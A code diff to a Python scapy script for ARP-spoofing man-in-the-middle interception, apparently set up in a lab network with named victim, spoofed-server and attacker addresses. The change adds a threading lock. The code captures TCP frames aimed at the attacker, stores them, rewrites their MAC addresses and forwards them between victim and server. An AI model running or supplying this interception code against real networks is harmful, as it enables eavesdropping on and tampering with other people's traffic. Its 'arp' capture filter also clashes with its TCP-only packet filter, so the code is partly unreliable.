@@ -5,6 +5,7 @@ from threading import Lock
 import arpSpoof
 import util
 
+lock = Lock()
 networkInterface = "enp0s3"
 victimIP = "192.168.56.101"
 #victimMAC = "08:00:27:b0:a1:ab"
@@ -16,8 +17,10 @@ spoofIP = "192.168.56.102"
 interceptedPkt = []
 
 def arpSniffing(attackerMAC, victimIP, spoofIP, networkInterface):
+    lock.acquire()
     victimMAC = util.getMAC(victimIP, networkInterface)
     serverMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP]
+    lock.release()
 
     def snifFilter(pkt):
         return (pkt.haslayer(TCP) and pkt[Ether].dst == attackerMAC and (
@@ -25,12 +28,14 @@ def arpSniffing(attackerMAC, victimIP, spoofIP, networkInterface):
 
     def intercept(pkt):
         interceptedPkt.append(pkt)
+        lock.acquire()
         if pkt[IP].dst in  spoofIP:
             pkt[Ether].dst = serverMAC[spoofIP.index(pkt[IP].dst)]
         else:
             pkt[Ether].dst = victimMAC
 
         pkt[Ether].src = attackerMAC
+        lock.release()
         sendp(pkt, iface=networkInterface)
 
     sniff(prn=intercept, iface=networkInterface, filter="arp", lfilter = snifFilter)
